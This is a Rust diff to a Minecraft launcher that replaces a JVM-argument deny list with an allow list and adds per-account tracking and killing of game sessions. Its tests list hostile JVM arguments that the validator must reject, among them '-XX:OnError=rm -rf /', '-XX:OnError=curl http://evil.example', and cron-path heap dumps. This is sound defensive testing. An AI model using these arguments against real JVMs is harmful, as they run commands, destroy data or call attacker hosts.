@@ -1,4 +1,4 @@
-use anyhow::{anyhow, bail, Context, Result};
+use anyhow::Result;
 use serde::Serialize;
 use std::collections::VecDeque;
 use std::io::{BufRead, BufReader, Read};
@@ -39,29 +39,161 @@ const OUT_OF_MEMORY_REASON: &str =
 
 const DISABLE_ATTACH_FLAG: &str = "-XX:+DisableAttachMechanism";
 
-const FORBIDDEN_JVM_ARG_PREFIXES: &[&str] = &[
-    "-agentlib:",
-    "-agentpath:",
-    "-javaagent:",
-    "-Xrunjdwp",
-    "-Xdebug",
-    "-Dcom.sun.management.jmxremote",
+const SIZE_JVM_FLAGS: &[&str] = &["-Xms", "-Xmx", "-Xmn", "-Xss"];
+
+const MODULE_VALUE_OPTIONS: &[&str] = &[
+    "-p",
+    "--module-path",
+    "--upgrade-module-path",
+    "--limit-modules",
+    "--add-modules",
+    "--add-opens",
+    "--add-exports",
+    "--add-reads",
+    "--patch-module",
+    "--enable-native-access",
 ];
 
+const ALLOWED_XX_VALUE_KEYS: &[&str] = &[
+    "MaxHeapSize",
+    "MinHeapSize",
+    "InitialHeapSize",
+    "SoftMaxHeapSize",
+    "MaxHeapFreeRatio",
+    "MinHeapFreeRatio",
+    "NewSize",
+    "MaxNewSize",
+    "NewRatio",
+    "SurvivorRatio",
+    "TargetSurvivorRatio",
+    "MaxTenuringThreshold",
+    "MetaspaceSize",
+    "MaxMetaspaceSize",
+    "CompressedClassSpaceSize",
+    "ReservedCodeCacheSize",
+    "MaxDirectMemorySize",
+    "MaxRAMPercentage",
+    "InitialRAMPercentage",
+    "MinRAMPercentage",
+    "MaxGCPauseMillis",
+    "InitiatingHeapOccupancyPercent",
+    "G1NewSizePercent",
+    "G1MaxNewSizePercent",
+    "G1HeapRegionSize",
+    "G1ReservePercent",
+    "G1HeapWastePercent",
+    "G1MixedGCCountTarget",
+    "G1MixedGCLiveThresholdPercent",
+    "G1RSetUpdatingPauseTimePercent",
+    "G1PeriodicGCInterval",
+    "ParallelGCThreads",
+    "ConcGCThreads",
+    "ActiveProcessorCount",
+    "CompileThreshold",
+    "TrimNativeHeapInterval",
+];
+
+const ALLOWED_D_PROPERTY_KEYS: &[&str] = &[
+    "file.encoding",
+    "sun.jnu.encoding",
+    "java.awt.headless",
+    "java.io.tmpdir",
+    "java.library.path",
+    "java.net.preferIPv4Stack",
+    "java.net.preferIPv6Addresses",
+    "java.rmi.server.useCodebaseOnly",
+    "jna.tmpdir",
+    "org.lwjgl.system.SharedLibraryExtractPath",
+    "io.netty.native.workdir",
+    "sun.rmi.dgc.server.gcInterval",
+    "sun.rmi.dgc.client.gcInterval",
+    "user.timezone",
+    "ignoreList",
+    "mergeModules",
+    "libraryDirectory",
+];
+
+const ALLOWED_D_PROPERTY_PREFIXES: &[&str] =
+    &["forge.", "neoforge.", "minecraft.launcher.", "log4j2."];
+
+fn is_size_value(value: &str) -> bool {
+    let digits = value
+        .strip_suffix(|c: char| matches!(c, 'k' | 'K' | 'm' | 'M' | 'g' | 'G'))
+        .unwrap_or(value);
+    !digits.is_empty() && digits.bytes().all(|b| b.is_ascii_digit())
+}
+
+fn is_flag_name(name: &str) -> bool {
+    name.chars().next().is_some_and(|c| c.is_ascii_alphabetic())
+        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+}
+
+fn is_bare_heap_dump_name(value: &str) -> bool {
+    !value.is_empty() && !value.contains('/') && !value.contains('\\') && !value.contains("..")
+}
+
+fn is_allowed_jvm_arg(arg: &str) -> bool {
+    if arg == "-XstartOnFirstThread" {
+        return true;
+    }
+    if SIZE_JVM_FLAGS
+        .iter()
+        .any(|flag| arg.starts_with(flag) && is_size_value(&arg[flag.len()..]))
+    {
+        return true;
+    }
+    if let Some(rest) = arg
+        .strip_prefix("-XX:+")
+        .or_else(|| arg.strip_prefix("-XX:-"))
+    {
+        return is_flag_name(rest);
+    }
+    if let Some(rest) = arg.strip_prefix("-XX:") {
+        let Some((key, value)) = rest.split_once('=') else {
+            return false;
+        };
+        if !is_flag_name(key) {
+            return false;
+        }
+        if key == "HeapDumpPath" {
+            return is_bare_heap_dump_name(value);
+        }
+        return !value.is_empty() && ALLOWED_XX_VALUE_KEYS.contains(&key);
+    }
+    if let Some(rest) = arg.strip_prefix("-D") {
+        let key = rest.split_once('=').map(|(k, _)| k).unwrap_or(rest);
+        return !key.is_empty()
+            && (ALLOWED_D_PROPERTY_KEYS.contains(&key)
+                || ALLOWED_D_PROPERTY_PREFIXES
+                    .iter()
+                    .any(|prefix| key.starts_with(prefix)));
+    }
+    MODULE_VALUE_OPTIONS.iter().any(|option| {
+        arg.strip_prefix(option)
+            .is_some_and(|value| value.starts_with('=') && value.len() > 1)
+    })
+}
+
 pub(crate) fn validate_jvm_args(jvm_args: &[String]) -> Result<()> {
-    let forbidden = jvm_args.iter().find_map(|arg| {
-        FORBIDDEN_JVM_ARG_PREFIXES
-            .iter()
-            .find(|prefix| arg.starts_with(**prefix))
-            .map(|_| arg.as_str())
-    });
-    let Some(arg) = forbidden else {
-        return Ok(());
-    };
-    Err(LauncherError::GameProcess(format!(
-        "В JVM-аргументах проекта указан запрещённый параметр «{arg}»: debug-агенты и удалённое управление JVM отключены в целях безопасности. Удалите его в настройках проекта"
-    ))
-    .into())
+    let mut option_value_next = false;
+    for arg in jvm_args {
+        if option_value_next {
+            option_value_next = false;
+            continue;
+        }
+        if MODULE_VALUE_OPTIONS.contains(&arg.as_str()) {
+            option_value_next = true;
+            continue;
+        }
+        if is_allowed_jvm_arg(arg) {
+            continue;
+        }
+        return Err(LauncherError::GameProcess(format!(
+            "В JVM-аргументах проекта указан запрещённый параметр \"{arg}\": разрешены только параметры памяти, GC-тюнинга, системные свойства из списка и модульные опции JDK. Удалите его в настройках проекта"
+        ))
+        .into());
+    }
+    Ok(())
 }
 
 fn finalize_jvm_args(
@@ -88,60 +220,145 @@ fn exit_reason(last_output: &StdMutex<VecDeque<String>>) -> Option<String> {
     None
 }
 
+fn panic_payload_text(payload: &(dyn std::any::Any + Send)) -> String {
+    if let Some(text) = payload.downcast_ref::<&str>() {
+        (*text).to_string()
+    } else if let Some(text) = payload.downcast_ref::<String>() {
+        text.clone()
+    } else {
+        "неизвестная паника".to_string()
+    }
+}
+
 #[derive(Clone, Serialize)]
 pub struct GameExitPayload {
     pub success: bool,
     pub code: Option<i32>,
     pub reason: Option<String>,
+    pub username: String,
 }
 
-static GAME_PID: StdMutex<Option<u32>> = StdMutex::new(None);
+type SharedGameChild = Arc<StdMutex<std::process::Child>>;
 
-pub fn current_game_pid() -> Option<u32> {
-    *GAME_PID.lock().unwrap_or_else(|e| e.into_inner())
+struct RegisteredGame {
+    child: SharedGameChild,
+    username: String,
 }
 
-fn register_game_pid(pid: u32) {
-    *GAME_PID.lock().unwrap_or_else(|e| e.into_inner()) = Some(pid);
+static GAME_SESSIONS: StdMutex<Vec<RegisteredGame>> = StdMutex::new(Vec::new());
+
+pub fn game_running() -> bool {
+    !GAME_SESSIONS
+        .lock()
+        .unwrap_or_else(|e| e.into_inner())
+        .is_empty()
 }
 
-fn clear_game_pid(pid: u32) {
-    let mut stored = GAME_PID.lock().unwrap_or_else(|e| e.into_inner());
-    if *stored == Some(pid) {
-        *stored = None;
+pub fn game_usernames() -> Vec<String> {
+    GAME_SESSIONS
+        .lock()
+        .unwrap_or_else(|e| e.into_inner())
+        .iter()
+        .map(|game| game.username.clone())
+        .collect()
+}
+
+pub fn ensure_session_free(username: &str) -> Result<()> {
+    let taken = GAME_SESSIONS
+        .lock()
+        .unwrap_or_else(|e| e.into_inner())
+        .iter()
+        .any(|game| game.username == username);
+    if taken {
+        return Err(LauncherError::GameProcess(format!(
+            "Игра уже запущена с аккаунта {username}, завершите его сессию перед новым запуском"
+        ))
+        .into());
+    }
+    Ok(())
+}
+
+fn register_game_session(
+    child: std::process::Child,
+    username: &str,
+) -> std::result::Result<SharedGameChild, std::process::Child> {
+    let mut registry = GAME_SESSIONS.lock().unwrap_or_else(|e| e.into_inner());
+    if registry.iter().any(|game| game.username == username) {
+        return Err(child);
+    }
+    let shared = Arc::new(StdMutex::new(child));
+    registry.push(RegisteredGame {
+        child: Arc::clone(&shared),
+        username: username.to_string(),
+    });
+    Ok(shared)
+}
+
+fn remove_game_session(child: &SharedGameChild) {
+    let mut registry = GAME_SESSIONS.lock().unwrap_or_else(|e| e.into_inner());
+    registry.retain(|game| !Arc::ptr_eq(&game.child, child));
+}
+
+fn mark_game_finalized(exited: &AtomicBool, child: &SharedGameChild) {
+    exited.store(true, AtomicOrdering::Relaxed);
+    remove_game_session(child);
+}
+
+fn kill_and_reap(child: &mut std::process::Child) {
+    let _ = child.kill();
+    let _ = child.wait();
+}
+
+fn terminate_session_child(child: &SharedGameChild) -> Option<String> {
+    let mut guard = child.lock().unwrap_or_else(|e| e.into_inner());
+    match guard.try_wait() {
+        Ok(Some(_)) => {
+            log_info!("Игра уже завершилась, принудительное завершение не требуется");
+            None
+        }
+        Ok(None) => {
+            let pid = guard.id();
+            if let Err(e) = guard.kill() {
+                return Some(format!("PID {pid}: не удалось завершить: {e}"));
+            }
+            log_info!("Процесс игры принудительно завершён (PID {pid})");
+            None
+        }
+        Err(e) => Some(format!(
+            "PID {}: не удалось получить статус процесса игры: {e}",
+            guard.id()
+        )),
     }
 }
 
-fn build_kill_command(pid: u32) -> Command {
-    #[cfg(target_os = "windows")]
-    {
-        let mut command = Command::new("taskkill");
-        command.args(["/PID", &pid.to_string(), "/T", "/F"]);
-        command.creation_flags(CREATE_NO_WINDOW);
-        command
+fn aggregated_kill_error(failures: &[String]) -> Result<()> {
+    if failures.is_empty() {
+        return Ok(());
     }
-    #[cfg(not(target_os = "windows"))]
-    {
-        let mut command = Command::new("kill");
-        command.args(["-9", &pid.to_string()]);
-        command
-    }
+    Err(LauncherError::GameProcess(format!(
+        "Не удалось завершить процесс игры: {}",
+        failures.join("\n")
+    ))
+    .into())
 }
 
 pub fn kill_game_process() -> Result<()> {
-    let Some(pid) = current_game_pid() else {
-        return Err(anyhow!(LauncherError::InvalidInput(
-            "Игра не запущена".to_string()
-        )));
-    };
-    let status = build_kill_command(pid)
-        .status()
-        .with_context(|| format!("Не удалось завершить процесс игры (PID {pid})"))?;
-    if !status.success() {
-        bail!("Не удалось завершить процесс игры (PID {pid}): {status}");
+    let children = GAME_SESSIONS
+        .lock()
+        .unwrap_or_else(|e| e.into_inner())
+        .iter()
+        .map(|game| Arc::clone(&game.child))
+        .collect::<Vec<_>>();
+    if children.is_empty() {
+        return Err(LauncherError::InvalidInput("Игра не запущена".to_string()).into());
     }
-    log_info!("Процесс игры принудительно завершён (PID {pid})");
-    Ok(())
+    let mut failures: Vec<String> = Vec::new();
+    for child in &children {
+        if let Some(failure) = terminate_session_child(child) {
+            failures.push(failure);
+        }
+    }
+    aggregated_kill_error(&failures)
 }
 
 pub struct GameProcess {
@@ -232,6 +449,7 @@ fn spawn_output_reader(
     last_output: Arc<StdMutex<VecDeque<String>>>,
     window_opened: Arc<AtomicBool>,
     is_error: bool,
+    username: String,
 ) -> thread::JoinHandle<()> {
     thread::spawn(move || {
         let mut reader = BufReader::new(stream);
@@ -246,10 +464,10 @@ fn spawn_output_reader(
             }
             let lossy = String::from_utf8_lossy(&buffer);
             let line = lossy.trim_end_matches(['\r', '\n']);
-            send_game_output(format!("[MC] {}", line), is_error);
+            send_game_output(format!("[MC|{username}] {line}"), is_error, &username);
             track_output(&last_output, line);
             if !window_opened.load(AtomicOrdering::Relaxed) && is_window_open_marker(line) {
-                log_info!("Обнаружено открытие окна игры");
+                log_info!("Обнаружено открытие окна игры ({username})");
                 window_opened.store(true, AtomicOrdering::Relaxed);
             }
         }
@@ -270,8 +488,9 @@ pub fn spawn_game_process(
     app: AppHandle,
     config: GameConfig,
     server_url: Option<&str>,
+    username: String,
 ) -> Result<GameProcess> {
-    log_info!("\n▶ Запуск Minecraft...");
+    log_info!("\nЗапуск Minecraft...");
     log_info!("Main class: {}", &config.main_class);
     log_info!("Java: {:?}", &config.java_path);
     log_info!("Classpath entries: {}", config.classpath.len());
@@ -337,15 +556,28 @@ pub fn spawn_game_process(
     let mut child = command.spawn().map_err(|e| {
         LauncherError::GameProcess(format!("Не удалось запустить Java процесс: {e:#}"))
     })?;
-    let game_pid = child.id();
-    register_game_pid(game_pid);
-
-    let stdout = child.stdout.take().ok_or(LauncherError::GameProcess(
-        "Не удалось получить stdout процесса".to_string(),
-    ))?;
-    let stderr = child.stderr.take().ok_or(LauncherError::GameProcess(
-        "Не удалось получить stderr процесса".to_string(),
-    ))?;
+    let Some(stdout) = child.stdout.take() else {
+        kill_and_reap(&mut child);
+        return Err(
+            LauncherError::GameProcess("Не удалось получить stdout процесса".to_string()).into(),
+        );
+    };
+    let Some(stderr) = child.stderr.take() else {
+        kill_and_reap(&mut child);
+        return Err(
+            LauncherError::GameProcess("Не удалось получить stderr процесса".to_string()).into(),
+        );
+    };
+    let shared_child = match register_game_session(child, &username) {
+        Ok(shared) => shared,
+        Err(mut orphan) => {
+            kill_and_reap(&mut orphan);
+            return Err(LauncherError::GameProcess(format!(
+                "Игра уже запущена с аккаунта {username}, повторный запуск невозможен"
+            ))
+            .into());
+        }
+    };
 
     let process = GameProcess {
         window_opened: Arc::new(AtomicBool::new(false)),
@@ -359,6 +591,7 @@ pub fn spawn_game_process(
         Arc::clone(&process.last_output),
         Arc::clone(&process.window_opened),
         false,
+        username.clone(),
     );
 
     let stderr_reader = spawn_output_reader(
@@ -366,17 +599,50 @@ pub fn spawn_game_process(
         Arc::clone(&process.last_output),
         Arc::clone(&process.window_opened),
         true,
+        username.clone(),
     );
 
     let exited = Arc::clone(&process.exited);
     let exit_status = Arc::clone(&process.exit_status);
     let last_output = Arc::clone(&process.last_output);
+    let exit_username = username.clone();
     thread::spawn(move || {
-        let (result, payload) = match child.wait() {
+        let mut panic_guard = GameExitPanicGuard {
+            app: app.clone(),
+            exited: Arc::clone(&exited),
+            child: Arc::clone(&shared_child),
+            username: exit_username.clone(),
+            armed: true,
+        };
+        let status = loop {
+            let outcome = {
+                let mut child = shared_child.lock().unwrap_or_else(|e| e.into_inner());
+                child.try_wait()
+            };
+            match outcome {
+                Ok(Some(status)) => break Ok(status),
+                Ok(None) => {}
+                Err(e) => break Err(e),
+            }
+            thread::sleep(Duration::from_millis(100));
+        };
+        let (result, payload) = match status {
             Ok(status) => {
-                let _ = stdout_reader.join();
-                let _ = stderr_reader.join();
-                log_info!("Minecraft завершился: {:?}", status);
+                if let Err(payload) = stdout_reader.join() {
+                    log_err!(
+                        "Поток чтения stdout игры ({}) прерван: {}",
+                        exit_username,
+                        panic_payload_text(payload.as_ref())
+                    );
+                }
+                if let Err(payload) = stderr_reader.join() {
+                    log_err!(
+                        "Поток чтения stderr игры ({}) прерван: {}",
+                        exit_username,
+                        panic_payload_text(payload.as_ref())
+                    );
+                }
+                log_info!("Minecraft завершился ({}): {:?}", exit_username, status);
                 let reason = if status.success() {
                     None
                 } else {
@@ -386,6 +652,7 @@ pub fn spawn_game_process(
                     success: status.success(),
                     code: status.code(),
                     reason,
+                    username: exit_username.clone(),
                 };
                 (Some(status.to_string()), payload)
             }
@@ -397,19 +664,73 @@ pub fn spawn_game_process(
                         success: false,
                         code: None,
                         reason: None,
+                        username: exit_username.clone(),
                     },
                 )
             }
         };
         *exit_status.lock().unwrap_or_else(|e| e.into_inner()) = result;
         exited.store(true, AtomicOrdering::Relaxed);
-        clear_game_pid(game_pid);
-        let _ = app.emit("game-exit", payload);
-        crate::tray::set_game_state(&app, false, "");
-        crate::discord::on_game_exit();
+        remove_game_session(&shared_child);
+        if let Err(e) = app.emit("game-exit", payload) {
+            log_err!(
+                "Не удалось отправить событие game-exit ({}): {}",
+                exit_username,
+                e
+            );
+        }
+        after_game_exit(&app, &exit_username);
+        panic_guard.disarm();
     });
 
     Ok(process)
+}
+
+fn after_game_exit(app: &AppHandle, username: &str) {
+    crate::tray::remove_game_session(app, username);
+    if !game_running() {
+        tauri::async_runtime::spawn(crate::discord::on_game_exit());
+    }
+}
+
+struct GameExitPanicGuard {
+    app: AppHandle,
+    exited: Arc<AtomicBool>,
+    child: SharedGameChild,
+    username: String,
+    armed: bool,
+}
+
+impl GameExitPanicGuard {
+    fn disarm(&mut self) {
+        self.armed = false;
+    }
+}
+
+impl Drop for GameExitPanicGuard {
+    fn drop(&mut self) {
+        if !self.armed {
+            return;
+        }
+        log_err!("Поток ожидания игры прерван, принудительная очистка состояния игры");
+        mark_game_finalized(&self.exited, &self.child);
+        if let Err(e) = self.app.emit(
+            "game-exit",
+            GameExitPayload {
+                success: false,
+                code: None,
+                reason: None,
+                username: self.username.clone(),
+            },
+        ) {
+            log_err!(
+                "Не удалось отправить game-exit после сбоя потока ожидания ({}): {}",
+                self.username,
+                e
+            );
+        }
+        after_game_exit(&self.app, &self.username);
+    }
 }
 
 #[cfg(test)]
@@ -447,6 +768,39 @@ mod jvm_args_guard_tests {
     }
 
     #[test]
+    fn blocks_command_execution_and_classpath_escape_flags() {
+        for arg in [
+            "-XX:OnError=rm -rf /",
+            "-XX:OnError=",
+            "-XX:OnOutOfMemoryError=shutdown /s",
+            "-Xbootclasspath/a:/tools/evil.jar",
+            "-Xbootclasspath/p:/tools/evil.jar",
+            "-XX:CompileCommandFile=/tmp/commands.txt",
+            "-XX:VMOptionsFile=/tmp/options",
+            "-XX:Flags=/tmp/flags",
+            "-XX:StartFlightRecording=filename=/tmp/rec.jfr",
+            "-XX:HeapDumpPath=/etc/cron.d/pwn",
+            "-XX:HeapDumpPath=../../escape.dump",
+            "-Djavax.net.ssl.trustStore=/tools/evil.jks",
+            "-Djavax.net.ssl.trustStorePassword=secret",
+            "-Djava.security.manager=EvilManager",
+            "-Djava.rmi.server.codebase=http://evil.example/",
+            "-Djava.system.class.loader=EvilLoader",
+            "-DsocksProxyHost=evil.example",
+            "-jar",
+            "/tools/evil.jar",
+            "-Xverify:none",
+            "-ea:cpw.mods.modlauncher...",
+        ] {
+            let message = validation_error(&[arg]);
+            assert!(
+                message.contains(arg),
+                "ошибка должна называть аргумент {arg}: {message}"
+            );
+        }
+    }
+
+    #[test]
     fn names_forbidden_flag_from_mixed_list() {
         let message = validation_error(&[
             "-Xmx4G",
@@ -465,21 +819,138 @@ mod jvm_args_guard_tests {
     fn allows_standard_args_and_presets() {
         let args: Vec<String> = [
             "-XX:+UseG1GC",
+            "-XX:+ParallelRefProcEnabled",
+            "-XX:MaxGCPauseMillis=200",
+            "-XX:+UnlockExperimentalVMOptions",
+            "-XX:+DisableExplicitGC",
+            "-XX:G1NewSizePercent=30",
+            "-XX:G1MaxNewSizePercent=40",
+            "-XX:G1HeapRegionSize=8M",
+            "-XX:G1ReservePercent=20",
+            "-XX:G1HeapWastePercent=5",
+            "-XX:G1MixedGCCountTarget=4",
+            "-XX:InitiatingHeapOccupancyPercent=15",
+            "-XX:G1MixedGCLiveThresholdPercent=90",
+            "-XX:G1RSetUpdatingPauseTimePercent=5",
+            "-XX:SurvivorRatio=32",
+            "-XX:+PerfDisableSharedMem",
+            "-XX:MaxTenuringThreshold=1",
             "-XX:-DisableAttachMechanism",
             "-XX:+DisableAttachMechanism",
+            "-XX:+UseSerialGC",
+            "-XX:+UseZGC",
+            "-XX:+UseStringDeduplication",
+            "-XX:+AlwaysPreTouch",
+            "-XX:TrimNativeHeapInterval=5000",
             "-Xms512M",
             "-Xmx4G",
             "-Xss1M",
+            "-Xmn256m",
+            "-XstartOnFirstThread",
             "-Dfile.encoding=UTF-8",
             "-Dsun.rmi.dgc.server.gcInterval=2147483646",
+            "-Dsun.rmi.dgc.client.gcInterval=2147483646",
             "-Djava.library.path=/game/natives",
-            "--add-modules=jdk.incubator.vector",
+            "-Djava.io.tmpdir=/game/natives",
+            "-Djna.tmpdir=/game/natives",
+            "-Dorg.lwjgl.system.SharedLibraryExtractPath=/game/natives",
+            "-Dio.netty.native.workdir=/game",
+            "-Djava.awt.headless",
+            "-Duser.timezone=Europe/Moscow",
+            "-Djava.rmi.server.useCodebaseOnly=true",
+            "-XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.game.minecraft.exe.heapdump",
+            "-XX:+HeapDumpOnOutOfMemoryError",
+            "-XX:MaxMetaspaceSize=1G",
+            "-XX:MetaspaceSize=512M",
+            "-XX:CompressedClassSpaceSize=256M",
+            "-XX:ReservedCodeCacheSize=512M",
+            "-XX:MaxDirectMemorySize=2G",
+            "-XX:MaxRAMPercentage=80.0",
+            "-XX:ParallelGCThreads=4",
+            "-XX:ConcGCThreads=2",
+            "-XX:ActiveProcessorCount=4",
         ]
         .iter()
         .map(|arg| arg.to_string())
         .collect();
 
         validate_jvm_args(&args).expect("штатные аргументы пресетов не должны запрещаться");
+    }
+
+    #[test]
+    fn allows_loader_and_manifest_property_args() {
+        let args: Vec<String> = [
+            "-Djava.net.preferIPv6Addresses=system",
+            "-Djava.net.preferIPv4Stack=false",
+            "-DignoreList=bootstraplauncher,securejarhandler,client-extra,1.20.4.jar",
+            "-DmergeModules=jna-5.10.0.jar,jna-platform-5.10.0.jar",
+            "-DlibraryDirectory=/game/libraries",
+            "-Dforge.enabledGameTestNamespaces=demo",
+            "-Dneoforge.enabledGameTestNamespaces=demo",
+            "-Dforge.forceNoTrace=true",
+            "-Dlog4j2.formatMsgNoLookups=true",
+            "-Dminecraft.launcher.brand=Limacina",
+            "-Dminecraft.launcher.version=1.20.4",
+            "--add-modules=jdk.incubator.vector",
+            "--enable-native-access=ALL-UNNAMED",
+        ]
+        .iter()
+        .map(|arg| arg.to_string())
+        .collect();
+
+        validate_jvm_args(&args).expect("аргументы лоадеров и манифестов не должны запрещаться");
+    }
+
+    #[test]
+    fn module_path_value_token_is_skipped() {
+        let args: Vec<String> = [
+            "-p",
+            "/game/libraries/cpw/mods/securejarhandler/2.1.24/securejarhandler-2.1.24.jar:/game/libraries/org/ow2/asm/asm/9.5/asm-9.5.jar",
+            "--add-opens",
+            "java.base/java.lang=ALL-UNNAMED",
+            "--module-path=/game/libraries",
+            "-Xmx4G",
+        ]
+        .iter()
+        .map(|arg| arg.to_string())
+        .collect();
+
+        validate_jvm_args(&args).expect("значение module-path — путь, а не опция");
+    }
+
+    #[test]
+    fn server_config_with_dangerous_arg_aborts_launch() {
+        let server_args: Vec<String> = [
+            "-Xms512M",
+            "-Xmx4G",
+            "-Dfile.encoding=UTF-8",
+            "-XX:+UseG1GC",
+            "-XX:OnError=curl http://evil.example",
+        ]
+        .iter()
+        .map(|arg| arg.to_string())
+        .collect();
+
+        let error = finalize_jvm_args(server_args, None, true)
+            .expect_err("опасный аргумент из серверного конфига должен отклонять запуск");
+
+        assert!(
+            error
+                .to_string()
+                .contains("-XX:OnError=curl http://evil.example"),
+            "ошибка должна называть опасный аргумент: {error}"
+        );
+
+        let safe_args: Vec<String> = [
+            "-Xms512M",
+            "-Xmx4G",
+            "-Dfile.encoding=UTF-8",
+            "-XX:+UseG1GC",
+        ]
+        .iter()
+        .map(|arg| arg.to_string())
+        .collect();
+        finalize_jvm_args(safe_args, None, true).expect("безопасный серверный конфиг запускается");
     }
 
     #[test]
@@ -620,6 +1091,7 @@ mod spawn_output_reader_tests {
             Arc::clone(&last_output),
             Arc::clone(&window_opened),
             false,
+            "Steve".to_string(),
         );
         handle
             .join()
@@ -855,6 +1327,7 @@ mod process_helpers_tests {
             Arc::clone(&last_output),
             Arc::clone(&window_opened),
             false,
+            "Steve".to_string(),
         );
         handle.join().expect("ридер не должен паниковать");
 
@@ -887,22 +1360,93 @@ mod process_helpers_tests {
 #[cfg(test)]
 mod kill_process_tests {
     use super::{
-        build_kill_command, clear_game_pid, current_game_pid, kill_game_process, register_game_pid,
-        GAME_PID,
+        aggregated_kill_error, ensure_session_free, game_running, game_usernames, kill_and_reap,
+        kill_game_process, mark_game_finalized, register_game_session, remove_game_session,
+        GAME_SESSIONS,
     };
-    use std::sync::Mutex;
+    use crate::utils::errors::LauncherError;
+    use std::sync::atomic::{AtomicBool, Ordering};
+    use std::sync::{Arc, Mutex as StdMutex};
     use std::time::Duration;
 
-    static KILL_TEST_LOCK: Mutex<()> = Mutex::new(());
+    static KILL_TEST_LOCK: StdMutex<()> = StdMutex::new(());
 
-    fn reset_game_pid() {
-        *GAME_PID.lock().unwrap_or_else(|e| e.into_inner()) = None;
+    fn reset_registry() {
+        GAME_SESSIONS
+            .lock()
+            .unwrap_or_else(|e| e.into_inner())
+            .clear();
+    }
+
+    fn lock_child(
+        child: &Arc<StdMutex<std::process::Child>>,
+    ) -> std::sync::MutexGuard<'_, std::process::Child> {
+        child.lock().unwrap_or_else(|e| e.into_inner())
+    }
+
+    #[cfg(unix)]
+    fn spawn_helper() -> std::process::Child {
+        std::process::Command::new("sleep")
+            .arg("30")
+            .spawn()
+            .expect("запуск тестового процесса")
+    }
+
+    #[cfg(target_os = "linux")]
+    fn process_state(pid: u32) -> Option<char> {
+        std::fs::read_to_string(format!("/proc/{pid}/stat"))
+            .ok()
+            .and_then(|stat| {
+                let after_comm = stat.rsplit(')').next()?;
+                after_comm.split_whitespace().next()?.chars().next()
+            })
+    }
+
+    #[test]
+    fn aggregated_kill_error_reports_every_failure() {
+        assert!(aggregated_kill_error(&[]).is_ok());
+
+        let error = aggregated_kill_error(&[
+            "PID 10: не удалось завершить: boom".to_string(),
+            "PID 11: не удалось получить статус процесса игры: gone".to_string(),
+        ])
+        .expect_err("при неудачах завершения должна возвращаться агрегированная ошибка");
+
+        let text = error.to_string();
+        assert!(
+            text.contains("Не удалось завершить процесс игры"),
+            "ошибка должна объяснять общий сбой: {text}"
+        );
+        assert!(text.contains("PID 10"), "первая неудача: {text}");
+        assert!(
+            text.contains("PID 11"),
+            "вторая неудача не потеряна: {text}"
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn kill_and_reap_terminates_child_without_zombie() {
+        let mut child = spawn_helper();
+        let pid = child.id();
+
+        kill_and_reap(&mut child);
+
+        assert!(
+            child.try_wait().is_ok(),
+            "опрос переапанного процесса не должен давать ошибок"
+        );
+        #[cfg(target_os = "linux")]
+        assert!(
+            process_state(pid).is_none(),
+            "после kill+wait процесс не должен оставаться в таблице процессов как зомби (pid {pid})"
+        );
     }
 
     #[test]
     fn kill_reports_missing_game() {
         let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
-        reset_game_pid();
+        reset_registry();
 
         let error =
             kill_game_process().expect_err("без зарегистрированного процесса должна быть ошибка");
@@ -913,86 +1457,230 @@ mod kill_process_tests {
         );
     }
 
+    #[cfg(unix)]
     #[test]
-    fn registry_clears_only_own_pid() {
+    fn session_free_guard_is_per_account() {
         let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
-        reset_game_pid();
+        reset_registry();
 
-        register_game_pid(111);
-        clear_game_pid(222);
-        assert_eq!(
-            current_game_pid(),
-            Some(111),
-            "чужой pid не должен очищать реестр"
+        ensure_session_free("Steve").expect("без сессий запуск разрешён любому аккаунту");
+
+        let first = register_game_session(spawn_helper(), "Steve").expect("регистрация");
+        assert!(game_running());
+
+        let error = ensure_session_free("Steve")
+            .expect_err("повторный запуск того же аккаунта отклоняется");
+        assert!(
+            matches!(
+                error.downcast_ref::<LauncherError>(),
+                Some(LauncherError::GameProcess(_))
+            ),
+            "ожидается GameProcess: {error}"
+        );
+        assert!(
+            error.to_string().contains("с аккаунта Steve"),
+            "ошибка должна называть аккаунт: {error}"
         );
 
-        clear_game_pid(111);
-        assert_eq!(current_game_pid(), None, "свой pid очищает реестр");
+        ensure_session_free("Alex").expect("другой аккаунт запускается параллельно");
 
-        reset_game_pid();
+        let exited = AtomicBool::new(false);
+        mark_game_finalized(&exited, &first);
+        assert!(exited.load(Ordering::Relaxed));
+        assert!(!game_running());
+        ensure_session_free("Steve").expect("после выхода сессия аккаунта снова свободна");
+
+        let _ = lock_child(&first).kill();
     }
 
     #[cfg(unix)]
     #[test]
-    fn build_kill_command_sends_sigkill_to_pid() {
-        let command = build_kill_command(4242);
-
-        assert_eq!(command.get_program(), "kill");
-        let args: Vec<String> = command
-            .get_args()
-            .map(|arg| arg.to_string_lossy().into_owned())
-            .collect();
-        assert_eq!(args, vec!["-9".to_string(), "4242".to_string()]);
-    }
-
-    #[cfg(target_os = "windows")]
-    #[test]
-    fn build_kill_command_force_kills_process_tree() {
-        let command = build_kill_command(4242);
-
-        assert_eq!(command.get_program(), "taskkill");
-        let args: Vec<String> = command
-            .get_args()
-            .map(|arg| arg.to_string_lossy().into_owned())
-            .collect();
-        assert_eq!(args, vec!["/PID", "4242", "/T", "/F"]);
-    }
-
-    #[cfg(unix)]
-    #[test]
-    fn kill_terminates_registered_process() {
+    fn usernames_list_all_registered_sessions() {
         let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
-        reset_game_pid();
+        reset_registry();
 
-        let mut child = std::process::Command::new("sleep")
-            .arg("30")
-            .spawn()
-            .expect("запуск тестового процесса");
-        let pid = child.id();
-        register_game_pid(pid);
+        let first = register_game_session(spawn_helper(), "Steve").expect("регистрация Steve");
+        let second = register_game_session(spawn_helper(), "Alex").expect("регистрация Alex");
+
+        assert_eq!(
+            game_usernames(),
+            vec!["Steve".to_string(), "Alex".to_string()]
+        );
+
+        remove_game_session(&first);
+        assert_eq!(
+            game_usernames(),
+            vec!["Alex".to_string()],
+            "выход первой игры не трогает вторую"
+        );
+        assert!(game_running(), "реестр держит вторую сессию");
+
+        remove_game_session(&second);
+        assert!(game_usernames().is_empty());
+        assert!(!game_running());
+
+        let _ = lock_child(&first).kill();
+        let _ = lock_child(&second).kill();
+    }
+
+    #[cfg(unix)]
+    #[test]
